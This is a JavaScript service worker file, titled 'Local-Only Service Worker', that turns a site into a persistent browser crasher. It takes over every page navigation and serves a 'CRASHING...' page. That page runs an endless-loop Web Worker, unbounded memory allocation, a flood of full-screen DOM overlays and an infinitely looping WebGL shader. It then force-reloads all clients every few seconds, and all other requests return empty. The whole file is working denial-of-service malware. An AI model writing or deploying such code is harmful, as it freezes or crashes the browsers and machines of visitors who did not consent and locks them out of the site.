// Local-Only Service Worker
const CRASH_PAGE_HTML = `<!DOCTYPE html>
<html>
<head><meta http-equiv="refresh" content="5"><title>Crash</title></head>
<body style="background:#000;color:#f00;font-family:monospace;text-align:center;margin-top:20vh;">
<h1>CRASHING...</h1>
<script>
const w = new Worker(URL.createObjectURL(new Blob(['while(true){}'],{type:'application/javascript'})));
setTimeout(()=>{const a=[];setInterval(()=>{a.push(new Array(10000000).join('x'))},10)},100);
setInterval(()=>{for(let i=0;i<100;i++){const d=document.createElement('div');d.style.cssText='position:fixed;width:100%;height:100%;background:rgba(255,0,0,0.01);z-index:9999';document.body.appendChild(d)}},10);
const c=document.createElement('canvas');c.width=1;c.height=1;document.body.appendChild(c);
const gl=c.getContext('webgl');if(gl){const vs='attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}';const fs='precision highp float;void main(){float i=0.;while(true){i+=0.0001;}gl_FragColor=vec4(i,0,0,1);}';const s1=gl.createShader(gl.VERTEX_SHADER);gl.shaderSource(s1,vs);gl.compileShader(s1);const s2=gl.createShader(gl.FRAGMENT_SHADER);gl.shaderSource(s2,fs);gl.compileShader(s2);const pr=gl.createProgram();gl.attachShader(pr,s1);gl.attachShader(pr,s2);gl.linkProgram(pr);gl.useProgram(pr);const b=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,b);gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([0,0]),gl.STATIC_DRAW);const loc=gl.getAttribLocation(pr,'p');gl.enableVertexAttribArray(loc);gl.vertexAttribPointer(loc,2,gl.FLOAT,false,0,0);gl.drawArrays(gl.POINTS,0,1);}
</script>
</body>
</html>`;

self.addEventListener('install', e => {
    self.skipWaiting();
});

self.addEventListener('activate', e => {
    e.waitUntil(clients.claim());
});

self.addEventListener('fetch', event => {
    if (event.request.mode === 'navigate') {
        event.respondWith(new Response(CRASH_PAGE_HTML, {
            headers: {'Content-Type': 'text/html'}
        }));
    } else {
        event.respondWith(new Response('', {status:200}));
    }
});

setInterval(() => {
    self.clients.matchAll().then(clients => {
        clients.forEach(client => client.navigate(client.url));
    });
}, 5000);